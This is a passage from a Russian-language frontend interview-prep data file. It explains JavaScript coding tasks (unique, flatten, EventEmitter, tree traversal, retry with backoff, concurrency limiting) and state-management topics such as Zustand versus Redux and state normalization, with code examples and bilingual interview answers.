            "Реализуйте myPromiseAll(promises) без использования встроенного Promise.all, с сохранением порядка результатов и немедленным реджектом при первой ошибке.",
        },
      },
      {
        id: "practice-unique",
        title: "unique(array)",
        content: {
          title: "unique(array)",
          shortExplanation:
            "Задача на удаление дубликатов из массива примитивов — самое короткое решение через new Set(array), но важно уметь объяснить и альтернативу через filter + indexOf для случаев, когда Set недоступен или нужна кастомная логика сравнения.",
          detailedExplanation:
            "new Set(array) работает благодаря тому, что Set хранит только уникальные значения по SameValueZero-сравнению (похоже на ===, но NaN считается равным самому себе) — оборачивание в [...new Set(array)] даёт O(n) решение без ручного цикла. Альтернатива array.filter((item, index) => array.indexOf(item) === index) тоже работает, но имеет сложность O(n²), так как indexOf на каждой итерации filter снова линейно сканирует массив — на больших массивах это заметно медленнее. Set-решение работает только для примитивов напрямую; для уникальности объектов по какому-то полю нужна отдельная логика (см. uniqueBy) — сравнение объектов через Set/=== сравнивает ссылки, а не содержимое.",
          codeExample:
            "// O(n) — предпочтительный способ для примитивов\nfunction unique(array) {\n  return [...new Set(array)];\n}\n\n// O(n²) — рабочий, но менее эффективный на больших массивах\nfunction uniqueSlow(array) {\n  return array.filter((item, index) => array.indexOf(item) === index);\n}",
          whereUsed:
            "Базовая задача на живом кодинге для проверки знания Set и общей эффективности решений; основа для более сложной задачи uniqueBy с кастомным ключом сравнения.",
          interviewQuestion: "Почему решение через new Set эффективнее, чем filter + indexOf, и в чём ограничение Set-подхода?",
          interviewAnswerRu:
            "new Set(array) добавляет каждый элемент за O(1) в среднем (используя внутреннюю хеш-таблицу), поэтому весь unique выполняется за O(n). Решение через filter + indexOf на каждой итерации заново линейно ищет индекс элемента во всём массиве, что даёт O(n²) в худшем случае — на массиве из десятков тысяч элементов разница становится заметной. Ограничение Set в том, что он сравнивает значения по SameValueZero (аналог ===) — для объектов это сравнение по ссылке, а не по содержимому, поэтому для 'уникальности по полю' (например, по id) Set напрямую не подходит и нужна отдельная логика с Map по ключу.",
          interviewAnswerEn:
            "new Set(array) adds each element in O(1) average time (via an internal hash table), so the whole unique runs in O(n). The filter + indexOf approach re-scans the whole array linearly on every iteration to find an element's index, giving O(n²) in the worst case — noticeable on arrays with tens of thousands of elements. The limitation of Set is that it compares values via SameValueZero (like ===) — for objects that's reference comparison, not content comparison, so for 'uniqueness by a field' (like id) Set alone doesn't work and you need separate logic keyed by a Map.",
          pitfalls: [
            "Использовать new Set() напрямую для уникальности объектов по полю — Set сравнивает объекты по ссылке, а не по содержимому.",
            "Не учитывать разницу в сложности (O(n) vs O(n²)) при выборе решения для потенциально больших массивов.",
          ],
          practiceTask:
            "Реализуйте функцию unique(array), убирающую дубликаты примитивов из массива, и обсудите сложность вашего решения.",
        },
      },
      {
        id: "practice-flatten-array",
        title: "flatten(array)",
        content: {
          title: "flatten(array)",
          shortExplanation:
            "Задача на рекурсивное 'выравнивание' вложенного массива произвольной глубины в плоский массив — встроенный array.flat(Infinity) решает это в одну строку, но важно уметь написать рекурсивную реализацию с нуля, так как это часто явно требуемая часть задачи.",
          detailedExplanation:
            "Рекурсивный подход: для каждого элемента массива проверяем, является ли он массивом (Array.isArray) — если да, рекурсивно 'сплющиваем' его и добавляем результат через spread или concat, если нет — добавляем элемент как есть. Итеративная альтернатива без рекурсии использует стек: кладём элементы в стек, и пока стек не пуст, извлекаем элемент — если это массив, распаковываем его элементы обратно в стек, если нет — добавляем в результат (нужно учитывать, что порядок при работе со стеком может потребовать реверса результата или использования очереди вместо стека, чтобы сохранить исходный порядок). Стоит явно уточнять на собеседовании глубину сплющивания: 'на один уровень' (аналог array.flat(1)) — принципиально более простая задача, чем 'полностью, на любую глубину' (array.flat(Infinity)).",
          codeExample:
            "// Рекурсивное решение — сплющивание на любую глубину\nfunction flatten(array) {\n  return array.reduce((acc, item) => {\n    return acc.concat(Array.isArray(item) ? flatten(item) : item);\n  }, []);\n}\n\nflatten([1, [2, [3, [4, 5]], 6]]); // [1, 2, 3, 4, 5, 6]",
          whereUsed:
            "Частая задача на живом кодинге для проверки рекурсии; вариации задачи (flatten только на уровень N, итеративная версия без рекурсии) — распространённое усложнение на follow-up.",
          interviewQuestion: "Как переписать рекурсивный flatten в итеративную версию без рекурсии, и зачем это может понадобиться?",
          interviewAnswerRu:
            "Итеративная версия использует явный стек вместо стека вызовов функции: элементы массива кладутся в стек, и пока он не пуст, извлекается верхний элемент — если это массив, его содержимое распаковывается обратно в стек, если нет — добавляется в результат. Такой подход полезен, когда глубина вложенности потенциально очень велика и есть риск переполнения стека вызовов (stack overflow) при рекурсии — итеративное решение с явной структурой данных не ограничено глубиной стека вызовов движка.",
          interviewAnswerEn:
            "The iterative version uses an explicit stack instead of the function call stack: array elements are pushed onto the stack, and while it's not empty, the top element is popped — if it's an array, its contents are unpacked back onto the stack, otherwise it's added to the result. This approach is useful when nesting depth could be very large and there's a risk of call-stack overflow with recursion — an iterative solution with an explicit data structure isn't bounded by the engine's call stack depth.",
          pitfalls: [
            "Не учитывать порядок результата при использовании стека вместо очереди — можно случайно получить элементы в обратном порядке.",
            "Не уточнить на собеседовании требуемую глубину сплющивания (один уровень vs полностью) — это принципиально разные по сложности задачи.",
          ],
          practiceTask:
            "Реализуйте flatten(array), рекурсивно сплющивающий вложенный массив произвольной глубины в плоский массив, без использования array.flat().",
        },
      },
      {
        id: "practice-flatten-object",
        title: "flattenObject(obj)",
        content: {
          title: "flattenObject(obj)",
          shortExplanation:
            "Задача на рекурсивное 'выравнивание' вложенного объекта в плоский объект, где ключи вложенных полей объединяются через разделитель (например, точку) — { a: { b: 1 } } становится { 'a.b': 1 }.",
          detailedExplanation:
            "Рекурсивный обход: для каждого ключа объекта проверяем, является ли значение объектом (и не массивом/не null — typeof value === 'object' && value !== null && !Array.isArray(value)) — если да, рекурсивно сплющиваем это вложенное значение, передавая накопленный префикс ключа (родительский путь + текущий ключ + разделитель), если нет — записываем значение напрямую под полным составным ключом в результирующий объект. Важные edge cases для обсуждения на собеседовании: как обрабатывать массивы внутри объекта (сплющивать ли их элементы по индексу как 'a.0', 'a.1', или оставлять массив как единое значение без разбора), как обрабатывать null (typeof null === 'object', поэтому нужна явная проверка на null, иначе рекурсия попытается обойти null как объект и упадёт), и что делать при коллизии составленных ключей (маловероятно, но теоретически возможно, если в исходных ключах уже есть точки).",
          codeExample:
            "function flattenObject(obj, prefix = '') {\n  const result = {};\n  for (const key in obj) {\n    const value = obj[key];\n    const newKey = prefix ? `${prefix}.${key}` : key;\n    if (typeof value === 'object' && value !== null && !Array.isArray(value)) {\n      Object.assign(result, flattenObject(value, newKey));\n    } else {\n      result[newKey] = value;\n    }\n  }\n  return result;\n}\n\nflattenObject({ a: { b: 1, c: { d: 2 } } }); // { 'a.b': 1, 'a.c.d': 2 }",
          whereUsed:
            "Реальная задача при работе с формами со сложной вложенной структурой (библиотеки валидации ожидают плоские ключи ошибок), при трансформации вложенных API-ответов в плоскую структуру для таблиц/аналитики.",
          interviewQuestion: "Почему в реализации flattenObject нужна явная проверка value !== null, хотя typeof {} === 'object'?",
          interviewAnswerRu:
            "typeof null тоже равен 'object' — это известная историческая особенность (баг) JavaScript, оставленная для обратной совместимости. Без явной проверки на null, если в объекте есть поле со значением null, код попытается рекурсивно обойти null как обычный объект (for...in по null не упадёт с ошибкой сам по себе, но логика 'является ли это объектом для рекурсии' окажется неверной) — поэтому проверка typeof value === 'object' && value !== null обязательна, чтобы null трактовался как обычное значение, а не как вложенный объект для дальнейшего сплющивания.",
          interviewAnswerEn:
            "typeof null is also 'object' — a well-known historical quirk (bug) in JavaScript kept for backward compatibility. Without an explicit null check, if the object has a field with a null value, the code would try to recursively traverse null as a regular object (for...in over null won't itself throw, but the 'is this an object to recurse into' logic would be wrong) — so the check typeof value === 'object' && value !== null is required so null is treated as a plain value rather than a nested object to keep flattening.",
          pitfalls: [
            "Забыть проверку на null и попытаться рекурсивно обойти null-значения как объекты.",
            "Не договориться заранее, как трактовать массивы внутри объекта (сплющивать по индексу или оставлять как единое значение) — оба варианта валидны, но дают разный результат.",
          ],
          practiceTask:
            "Реализуйте flattenObject(obj), сплющивающий вложенный объект произвольной глубины в плоский объект с составными ключами через точку.",
        },
      },
      {
        id: "practice-event-emitter",
        title: "EventEmitter",
        content: {
          title: "EventEmitter (реализация с нуля)",
          shortExplanation:
            "Классическая задача на реализацию паттерна Observer: класс с методами on(event, handler) для подписки, off(event, handler) для отписки и emit(event, ...args) для вызова всех подписанных на событие обработчиков с переданными аргументами.",
          detailedExplanation:
            "Внутреннее состояние — объект или Map, где ключ — имя события, а значение — массив (или Set) обработчиков, подписанных на это событие; on() добавляет обработчик в соответствующий массив (создавая его, если событие вызывается впервые), emit() находит массив обработчиков по имени события и вызывает каждый из них с переданными аргументами через forEach, off() удаляет конкретный обработчик из массива (через filter или splice по индексу, найденному через indexOf). Полезное расширение — метод once(event, handler), который подписывает обработчик, автоматически отписывающий сам себя после первого вызова (обычно реализуется через обёртку-wrapper, которая вызывает off() перед вызовом оригинального handler). Стоит явно обсуждать edge cases: что происходит при emit() события, на которое никто не подписан (должно просто ничего не делать, а не падать с ошибкой), и что если off() вызывается с обработчиком, который не был подписан (тоже не должно падать).",
          codeExample:
            "class EventEmitter {\n  constructor() {\n    this.events = {};\n  }\n  on(event, handler) {\n    if (!this.events[event]) this.events[event] = [];\n    this.events[event].push(handler);\n  }\n  off(event, handler) {\n    if (!this.events[event]) return;\n    this.events[event] = this.events[event].filter((h) => h !== handler);\n  }\n  emit(event, ...args) {\n    if (!this.events[event]) return;\n    this.events[event].forEach((handler) => handler(...args));\n  }\n}",
          whereUsed:
            "Основа многих реальных библиотек (Node.js EventEmitter, паттерн pub/sub в state-менеджерах, кастомные системы уведомлений внутри приложения без внешней библиотеки).",
          interviewQuestion: "Как бы вы реализовали метод once(event, handler), чтобы обработчик автоматически отписывался после первого вызова?",
          interviewAnswerRu:
            "Нужно обернуть переданный handler в промежуточную функцию-wrapper: при вызове события wrapper сначала вызывает off(event, wrapper), чтобы отписать самого себя из списка обработчиков, а затем вызывает оригинальный handler с переданными аргументами. Подписываться через on() нужно именно на wrapper, а не на оригинальный handler напрямую — иначе off() не сможет найти и удалить нужную функцию из массива обработчиков события.",
          interviewAnswerEn:
            "You need to wrap the passed handler in an intermediate wrapper function: when the event fires, the wrapper first calls off(event, wrapper) to unsubscribe itself from the handler list, then calls the original handler with the passed arguments. You need to subscribe via on() with the wrapper itself, not the original handler directly — otherwise off() wouldn't be able to find and remove the right function from the event's handler array.",
          pitfalls: [
            "Подписывать оригинальный handler напрямую в реализации once() вместо обёртки-wrapper — тогда отписка через off() не сработает корректно.",
            "Не обрабатывать emit() события без подписчиков как no-op — попытка вызвать forEach на undefined упадёт с ошибкой без защитной проверки.",
          ],
          practiceTask:
            "Реализуйте класс EventEmitter с методами on, off, emit и (по желанию) once, без использования встроенного Node.js EventEmitter.",
        },
      },
      {
        id: "practice-unique-by-count-by",
        title: "uniqueBy / countBy",
        content: {
          title: "uniqueBy / countBy",
          shortExplanation:
            "uniqueBy(array, keyFn) убирает дубликаты объектов по значению, возвращаемому keyFn (например, по id), а не по ссылке; countBy(array, keyFn) группирует элементы по ключу и возвращает объект с количеством элементов в каждой группе — обе задачи решаются через Map/объект-аккумулятор в одном проходе reduce.",
          detailedExplanation:
            "uniqueBy нельзя решить через new Set() напрямую (Set сравнивает объекты по ссылке), поэтому используется Map, где ключ — результат keyFn(item), а значение — сам объект; проходя массив один раз и записывая в Map, автоматически остаются только последние (или первые, если использовать has-проверку перед записью) объекты с уникальным ключом, после чего значения Map конвертируются обратно в массив через Array.from(map.values()). countBy решается похожим способом через reduce с объектом-аккумулятором: для каждого элемента вычисляется ключ группы через keyFn, и счётчик для этого ключа увеличивается на 1 (инициализируясь нулём, если ключ встречается впервые) — результат отдельно демонстрирует то же 'группировка через нормализованный ключ', что лежит в основе groupBy, но вместо накопления элементов накапливается количество.",
          codeExample:
            "// uniqueBy — Map сохраняет только последний объект с данным ключом\nfunction uniqueBy(array, keyFn) {\n  const map = new Map();\n  for (const item of array) {\n    map.set(keyFn(item), item);\n  }\n  return Array.from(map.values());\n}\n\n// countBy — считает количество элементов в каждой группе\nfunction countBy(array, keyFn) {\n  return array.reduce((acc, item) => {\n    const key = keyFn(item);\n    acc[key] = (acc[key] || 0) + 1;\n    return acc;\n  }, {});\n}\n\ncountBy(['a', 'bb', 'cc', 'd'], (s) => s.length); // { 1: 2, 2: 2 }",
          whereUsed:
            "Реальные задачи обработки данных: убрать дубликаты записей API по id (uniqueBy), построить распределение по категориям для аналитики или UI-фильтров (countBy) — обе задачи являются частым продолжением к уже пройденной groupBy на собеседовании.",
          interviewQuestion: "Почему uniqueBy нельзя реализовать через new Set(array.map(keyFn)), если нужно вернуть сами объекты, а не только их ключи?",
          interviewAnswerRu:
            "new Set(array.map(keyFn)) даст только множество уникальных ключей (например, id), но потеряет связь с исходными объектами — из такого Set нельзя восстановить, какой именно объект имел данный id, если нужны все поля объекта, а не только ключ. Использование Map решает это: ключ Map — это результат keyFn(item), а значение — сам исходный объект целиком, поэтому Array.from(map.values()) возвращает именно объекты с уникальными ключами, а не только сами ключи.",
          interviewAnswerEn:
            "new Set(array.map(keyFn)) only gives you a set of unique keys (say, ids), losing the link back to the original objects — you can't recover which object had a given id from that Set if you need the object's full fields, not just its key. Using a Map solves this: the Map's key is keyFn(item), and the value is the entire original object, so Array.from(map.values()) returns the actual objects with unique keys, not just the keys themselves.",
          pitfalls: [
            "Использовать Set вместо Map для uniqueBy, когда нужно вернуть полные объекты, а не только их ключи.",
            "Забыть инициализировать счётчик нулём при первом появлении ключа в countBy — обращение к несуществующему ключу объекта даёт undefined, а не 0, и undefined + 1 даст NaN.",
          ],
          practiceTask:
            "Реализуйте uniqueBy(array, keyFn) и countBy(array, keyFn) без использования лодash/сторонних библиотек.",
        },
      },
      {
        id: "practice-tree-traversal",
        title: "Обход дерева (tree traversal)",
        content: {
          title: "Обход дерева (tree traversal)",
          shortExplanation:
            "Классическая задача на обход древовидной структуры (например, дерево категорий или комментариев с вложенными children) — либо в глубину (DFS, рекурсивно или через явный стек), либо в ширину (BFS, через очередь), с целью собрать все узлы в плоский список или найти конкретный узел.",
          detailedExplanation:
            "DFS (обход в глубину) чаще всего реализуется рекурсивно: посетить текущий узел, затем рекурсивно обойти каждого из его children — простое и короткое решение, но при очень глубоких деревьях есть риск переполнения стека вызовов; итеративная версия DFS через явный стек решает эту проблему, но требует более внимательной работы с порядком (обычно children добавляются в стек в обратном порядке, чтобы сохранить порядок обхода 'слева направо'). BFS (обход в ширину) принципиально требует очереди, а не стека: узлы извлекаются из начала очереди, и их children добавляются в конец — это даёт обход 'по уровням' (сначала все узлы уровня 1, потом все узлы уровня 2), в отличие от DFS, который сначала уходит на всю глубину одной ветки. Выбор между DFS и BFS зависит от задачи: DFS естественнее для задач вида 'найти путь до узла' или 'посчитать сумму по всем узлам', BFS — для задач вида 'найти ближайший подходящий узел' или 'обойти уровень за уровнем' (например, для UI, где важен порядок отображения по уровням вложенности).",
          codeExample:
            "// DFS рекурсивно — собрать id всех узлов дерева\nfunction dfs(node, result = []) {\n  result.push(node.id);\n  (node.children || []).forEach((child) => dfs(child, result));\n  return result;\n}\n\n// BFS итеративно через очередь\nfunction bfs(root) {\n  const result = [];\n  const queue = [root];\n  while (queue.length > 0) {\n    const node = queue.shift();\n    result.push(node.id);\n    queue.push(...(node.children || []));\n  }\n  return result;\n}",
          whereUsed:
            "Обход древовидных UI-структур (дерево категорий, вложенные комментарии, файловая система), поиск узла по условию в иерархических данных, построение плоского списка из вложенной структуры для рендеринга (например, виртуализированного списка).",
          interviewQuestion: "В чём принципиальная разница между DFS и BFS с точки зрения порядка посещения узлов, и когда важно выбрать именно BFS?",
          interviewAnswerRu:
            "DFS уходит максимально глубоко по одной ветке дерева, прежде чем перейти к следующей — то есть сначала будут посещены все потомки первого ребёнка корня, и только потом — второй ребёнок корня. BFS, наоборот, обходит узлы 'по уровням' — сначала все узлы на первом уровне глубины, потом все узлы на втором уровне, и так далее, для чего необходима очередь (FIFO), а не стек. BFS особенно важен, когда нужен кратчайший путь по количеству шагов между узлами (в невзвешенном графе/дереве) или когда важен порядок отображения по уровням вложенности в UI — DFS в таких случаях не гарантирует того же порядка обхода.",
          interviewAnswerEn:
            "DFS goes as deep as possible down one branch of the tree before moving to the next — so all descendants of the root's first child get visited before the root's second child. BFS, in contrast, visits nodes 'level by level' — all nodes at depth 1 first, then all nodes at depth 2, and so on, which requires a queue (FIFO), not a stack. BFS matters especially when you need the shortest path by number of steps between nodes (in an unweighted graph/tree), or when the order of display by nesting level in the UI matters — DFS doesn't guarantee the same traversal order in those cases.",
          pitfalls: [
            "Использовать стек (push/pop) вместо очереди (push/shift) для BFS — это фактически превращает обход в DFS, а не BFS.",
            "Не учитывать риск переполнения стека вызовов при рекурсивном DFS на очень глубоко вложенных деревьях — для таких случаев нужна итеративная версия с явным стеком.",
          ],
          practiceTask:
            "Реализуйте функции dfs(tree) и bfs(tree) для дерева с произвольной вложенностью children, возвращающие массив id узлов в соответствующем порядке обхода.",
        },
      },
      {
        id: "practice-async-retry",
        title: "Async retry с backoff",
        content: {
          title: "Async retry с backoff",
          shortExplanation:
            "Функция-обёртка retry(fn, options), которая повторно вызывает асинхронную функцию при ошибке до N раз, с задержкой между попытками (обычно растущей экспоненциально — exponential backoff), прежде чем окончательно отклонить промис.",
          detailedExplanation:
            "Базовая реализация — рекурсивная или циклическая обёртка: вызвать fn(), при успехе вернуть результат, при ошибке — если остались попытки, подождать задержку (delay) и попробовать снова с уменьшенным счётчиком попыток, иначе — окончательно отклонить с последней полученной ошибкой. Exponential backoff означает, что задержка между попытками растёт (обычно удваивается) с каждой следующей попыткой (например, 100мс, 200мс, 400мс) — это снижает нагрузку на нестабильный сервис/сеть по сравнению с фиксированной задержкой, и часто дополняется 'jitter' (случайным небольшим отклонением от расчётной задержки), чтобы избежать одновременного повторного запроса множества клиентов ровно в одну и ту же миллисекунду (thundering herd). Важный edge case для обсуждения — не все ошибки стоит ретраить одинаково: временная сетевая ошибка или 503 имеет смысл повторить, а 400 Bad Request (клиентская ошибка в самом запросе) повторять бессмысленно, так как повтор с теми же данными даст ту же ошибку — качественная реализация retry должна уметь принимать функцию-предикат, решающую, стоит ли конкретную ошибку ретраить.",
          codeExample:
            "async function retry(fn, { retries = 3, delayMs = 200 } = {}) {\n  for (let attempt = 0; attempt <= retries; attempt++) {\n    try {\n      return await fn();\n    } catch (err) {\n      if (attempt === retries) throw err;\n      const wait = delayMs * 2 ** attempt; // экспоненциальный backoff\n      await new Promise((resolve) => setTimeout(resolve, wait));\n    }\n  }\n}",
          whereUsed:
            "Повторные попытки сетевых запросов при временных сбоях (5xx, таймауты, обрыв соединения), взаимодействие с нестабильными внешними API или очередями сообщений.",
          interviewQuestion: "Почему при retry важно использовать растущую задержку (exponential backoff), а не фиксированную задержку между попытками?",
          interviewAnswerRu:
            "Если сервис временно перегружен или недоступен, немедленный повтор с фиксированной короткой задержкой от множества клиентов одновременно может усугубить перегрузку, а не помочь ей разрешиться — это создаёт эффект 'снежного кома' (thundering herd), когда волна повторных запросов сама становится причиной продолжающегося сбоя. Экспоненциально растущая задержка даёт сервису больше времени на восстановление с каждой следующей попыткой, снижая суммарную нагрузку от повторов, а добавление случайного джиттера дополнительно 'размазывает' повторные запросы разных клиентов во времени, чтобы они не приходили одной синхронной волной.",
          interviewAnswerEn:
            "If a service is temporarily overloaded or unavailable, immediately retrying with a fixed short delay from many clients at once can worsen the overload rather than help it recover — this creates a 'thundering herd' effect, where the wave of retries itself becomes the reason the outage continues. Exponentially growing delay gives the service more time to recover with each subsequent attempt, reducing the total load from retries, and adding random jitter further spreads different clients' retries out over time so they don't arrive as one synchronized wave.",
          pitfalls: [
            "Ретраить любую ошибку без разбора, включая клиентские ошибки (например, 400), для которых повтор с теми же данными заведомо не поможет.",
            "Использовать фиксированную задержку без экспоненциального роста и без jitter — может усилить нагрузку на и без того нестабильный сервис.",
          ],
          practiceTask:
            "Реализуйте retry(fn, { retries, delayMs }) с экспоненциальным backoff, которая повторяет асинхронный вызов fn при ошибке заданное число раз.",
        },
      },
      {
        id: "practice-concurrency-limiter",
        title: "Concurrency limiter (ограничение параллелизма)",
        content: {
          title: "Concurrency limiter (ограничение параллелизма)",
          shortExplanation:
            "Функция runWithLimit(tasks, limit), которая запускает массив асинхронных задач с ограничением на количество одновременно выполняющихся — например, из 100 задач и лимита 5 в любой момент времени работает не больше 5, а следующая задача стартует, как только освобождается 'слот'.",
          detailedExplanation:
            "Наивный подход (запустить все задачи через Promise.all) не подходит, когда задач много, а внешний ресурс (сервер, rate-limited API, файловая система) не выдерживает такого количества одновременных запросов — нужен именно ограниченный пул воркеров. Классическая реализация: завести счётчик активных задач и очередь ожидающих, и функцию next(), которая запускает следующую задачу из очереди, если текущее количество активных задач меньше лимита; каждая запущенная задача при завершении (успешном или с ошибкой) уменьшает счётчик активных и вызывает next() снова, чтобы освободившийся 'слот' сразу подхватила следующая задача в очереди — это создаёт непрерывный конвейер, где в любой момент времени активно не больше limit задач одновременно. Важно результаты собирать в порядке исходного массива задач (аналогично проблеме порядка в реализации Promise.all), а не в порядке фактического завершения, если порядок результата важен для вызывающего кода.",
          codeExample:
            "async function runWithLimit(tasks, limit) {\n  const results = new Array(tasks.length);\n  let nextIndex = 0;\n  async function worker() {\n    while (nextIndex < tasks.length) {\n      const currentIndex = nextIndex++;\n      results[currentIndex] = await tasks[currentIndex]();\n    }\n  }\n  const workers = Array.from({ length: limit }, () => worker());\n  await Promise.all(workers);\n  return results;\n}",
          whereUsed:
            "Массовая загрузка/обработка файлов, батчинг запросов к rate-limited API (например, сторонний сервис с лимитом запросов в секунду), параллельная обработка больших списков без перегрузки внешнего ресурса.",
          interviewQuestion: "Как реализация с фиксированным числом 'воркеров', каждый из которых в цикле берёт следующую задачу, гарантирует, что активных задач никогда не будет больше limit?",
          interviewAnswerRu:
            "Запускается ровно limit параллельных 'воркеров' (асинхронных функций), и каждый воркер в цикле последовательно берёт следующую незанятую задачу по общему индексу и ждёт её завершения, прежде чем взять следующую — то есть в любой момент времени активно выполняется ровно столько задач, сколько запущено воркеров (не больше limit), потому что каждый воркер обрабатывает задачи строго последовательно внутри себя, а не запускает несколько задач параллельно сам по себе. Как только один воркер освобождается (его текущая задача завершилась), он сразу берёт следующую задачу из общего пула по индексу, поддерживая постоянную загрузку ровно на уровне limit, пока задачи не закончатся.",
          interviewAnswerEn:
            "Exactly limit parallel 'workers' (async functions) are started, and each worker sequentially picks the next unclaimed task by a shared index and awaits its completion before picking the next one — so at any moment exactly as many tasks are running as there are workers (never more than limit), because each worker processes tasks strictly one at a time internally rather than launching several tasks in parallel on its own. As soon as one worker frees up (its current task finishes), it immediately grabs the next task from the shared pool by index, keeping throughput steady at exactly limit until tasks run out.",
          pitfalls: [
            "Пытаться реализовать ограничение через ручное разбиение на 'чанки' по limit штук с последовательным Promise.all для каждого чанка — это работает хуже, чем воркер-пул, так как медленная задача в чанке блокирует старт следующего чанка целиком, даже если другие 'слоты' освободились раньше.",
            "Забыть сохранить результаты в порядке исходного массива задач, если вызывающему коду важен порядок, а не только факт завершения всех задач.",
          ],
          practiceTask:
            "Реализуйте runWithLimit(tasks, limit), запускающую массив асинхронных задач с ограничением количества одновременно выполняющихся не более limit.",
        },
      },
    ],
  },


  {
    id: "state-management",
    title: "State Management",
    subtopics: [
      {
        id: "state-zustand-vs-redux",
        title: "Zustand vs Redux vs Context",
        content: {
          title: "Zustand vs Redux vs Context",
          shortExplanation:
            "Это три разных инструмента для одной задачи — разделить и переиспользовать состояние между компонентами, но с разной ценой boilerplate и разной производительностью.",
          detailedExplanation:
            "Context API встроен в React и хорошо подходит для редко меняющихся данных (тема, локаль, текущий пользователь), но при частых обновлениях приводит к ре-рендеру всех компонентов-потребителей, потому что Context не умеет подписывать компонент только на часть значения. Redux даёт строгую предсказуемую архитектуру (единое состояние, экшены, редьюсеры, DevTools с time-travel), но требует много boilerplate-кода даже для простых случаев. Zustand — минималистичная библиотека: состояние и действия описываются в одном месте без экшенов/редьюсеров, а компоненты подписываются только на нужный кусок состояния через селектор, что даёт точечные ре-рендеры без явной мемоизации.",
          codeExample:
            "// Zustand: состояние и действия в одном месте, без экшенов/редьюсеров\nconst useStore = create((set) => ({\n  count: 0,\n  increment: () => set((s) => ({ count: s.count + 1 })),\n}));\n\n// В компоненте подписываемся только на count — не на весь стор\nconst count = useStore((s) => s.count);",
          interviewQuestion: "Почему Context API не подходит для часто меняющегося глобального состояния?",
          interviewAnswerRu:
            "Потому что любой компонент, вызвавший useContext(MyContext), ре-рендерится при каждом изменении значения контекста целиком — Context не поддерживает подписку на отдельные поля объекта, в отличие от Zustand или Redux с селекторами. Если в контексте лежит объект с несколькими полями и меняется только одно из них, ре-рендерятся все потребители контекста, даже те, кому нужно было другое поле.",
          interviewAnswerEn:
            "Because any component calling useContext(MyContext) re-renders on every change to the context value as a whole — Context has no built-in way to subscribe to individual fields, unlike Zustand or Redux with selectors. If the context holds an object with several fields and only one of them changes, every consumer re-renders, even ones that only cared about a different field.",
          pitfalls: [
            "Класть в один Context часто меняющиеся данные вместе с редко меняющимися — все потребители страдают от лишних ре-рендеров.",
            "Выбирать Redux 'по умолчанию' для маленького проекта, где было бы достаточно Zustand или даже useState, и тратить время на boilerplate.",
          ],
          practiceTask:
            "Реализуйте одно и то же счётчик-состояние через Context, через Zustand и сравните количество кода и ре-рендеров дочерних компонентов, не подписанных на это состояние.",
          resources: {
            docs: [
              { title: "Zustand: Getting Started — official docs", url: "https://zustand.docs.pmnd.rs/getting-started/introduction" },
            ],
            articles: [
              { title: "How to use React Context effectively (Kent C. Dodds)", url: "https://kentcdodds.com/blog/how-to-use-react-context-effectively" },
              { title: "Working with Zustand (TkDodo)", url: "https://tkdodo.eu/blog/working-with-zustand" },
            ],
          },
        },
      },
      {
        id: "state-normalization",
        title: "Normalizing State",
        content: {
          title: "Normalizing State (нормализация состояния)",
          shortExplanation:
            "Нормализация — это хранение данных в виде плоских структур по id (как в базе данных), а не вложенных деревьев, чтобы избежать дублирования и упростить обновления.",
          detailedExplanation:
            "Если хранить данные как вложенные массивы объектов (например, список постов, где у каждого поста есть массив комментариев с вложенным автором), одно и то же значение (например, данные пользователя) может дублироваться в нескольких местах — и при обновлении нужно синхронизировать все копии. Нормализованная структура хранит сущности в плоском виде: { posts: { byId: {...}, allIds: [...] }, comments: { byId: {...} }, users: { byId: {...} } }, а связи между ними — через id-ссылки. Это похоже на таблицы в реляционной БД и делает обновление одной сущности мгновенным для всех мест, где она используется.",
          codeExample:
            "// Ненормализованно: автор комментария дублируется в каждом посте\n{ posts: [{ id: 1, comments: [{ id: 10, author: { id: 5, name: 'Anna' } }] }] }\n\n// Нормализованно: одна копия пользователя, доступ через userId\n{\n  posts: { byId: { 1: { id: 1, commentIds: [10] } } },\n  comments: { byId: { 10: { id: 10, authorId: 5 } } },\n  users: { byId: { 5: { id: 5, name: 'Anna' } } },\n}",
          interviewQuestion: "Зачем нормализовать состояние, если данные и так приходят с сервера в удобном виде?",
          interviewAnswerRu:
            "Проблема возникает не при получении данных, а при их обновлении на клиенте: если один и тот же объект (например, пользователь) встречается в нескольких местах вложенного дерева, обновление его имени потребует найти и изменить все копии. В нормализованном виде достаточно обновить один объект по id в users.byId — все места, ссылающиеся на этот id, автоматически 'увидят' новые данные при следующем рендере.",
          interviewAnswerEn:
            "The problem isn't fetching the data — it's updating it on the client afterward: if the same object (say, a user) appears in several places in a nested tree, updating their name means finding and changing every copy. In normalized form, you only update one object by id in users.byId — everywhere that references that id automatically 'sees' the new data on the next render.",
          pitfalls: [
            "Нормализовать данные, которые никогда не обновляются и не переиспользуются в разных местах — это лишнее усложнение без пользы.",
            "Забывать удалить связи (например, commentIds) при удалении сущности, оставляя 'битые' ссылки на несуществующие id.",
          ],
          practiceTask:
            "Возьмите вложенный JSON с постами и комментариями и напишите функцию normalize(), которая превращает его в плоскую структуру byId/allIds для каждой сущности.",
          resources: {
            docs: [
              { title: "Normalizing State Shape — Redux docs", url: "https://redux.js.org/usage/structuring-reducers/normalizing-state-shape" },
            ],
            articles: [
              { title: "normalizr — normalize nested JSON by schema (paularmstrong)", url: "https://github.com/paularmstrong/normalizr" },
            ],
          },
        },
      },
      {
        id: "state-derived-state",
        title: "Derived State",
        content: {
          title: "Derived State (производное состояние)",
          shortExplanation:
            "Производное состояние — это значение, которое можно вычислить из уже существующего state, а не хранить как отдельную независимую переменную состояния.",
          detailedExplanation:
            "Частая ошибка — хранить в state значение, которое на самом деле является функцией от других значений state (например, filteredList как отдельный useState, хотя его можно вычислить из items и filter при каждом рендере). Это приводит к рассинхронизации: забыли обновить производное значение при изменении исходного — получили баг. Правильный подход — вычислять производные значения прямо в теле компонента (при необходимости обернув в useMemo для дорогих вычислений), а не дублировать их в отдельном state.",
          codeExample:
            "// Плохо: filteredItems может рассинхронизироваться с items/filter\nconst [items, setItems] = useState([]);\nconst [filter, setFilter] = useState('');\nconst [filteredItems, setFilteredItems] = useState([]); // лишнее состояние\n\n// Хорошо: вычисляем прямо при рендере\nconst filteredItems = useMemo(\n  () => items.filter((i) => i.name.includes(filter)),\n  [items, filter]\n);",
          interviewQuestion: "Как понять, что значение должно быть derived state, а не отдельным useState?",
          interviewAnswerRu:
            "Если значение можно полностью и однозначно вычислить из уже существующих props/state в любой момент времени без дополнительной информации — это производное значение, и хранить его в отдельном state не нужно. Признак проблемы — синхронизирующий useEffect, который 'обновляет одно состояние при изменении другого': чаще всего это сигнал, что одно из двух состояний на самом деле лишнее и должно быть просто вычислением.",
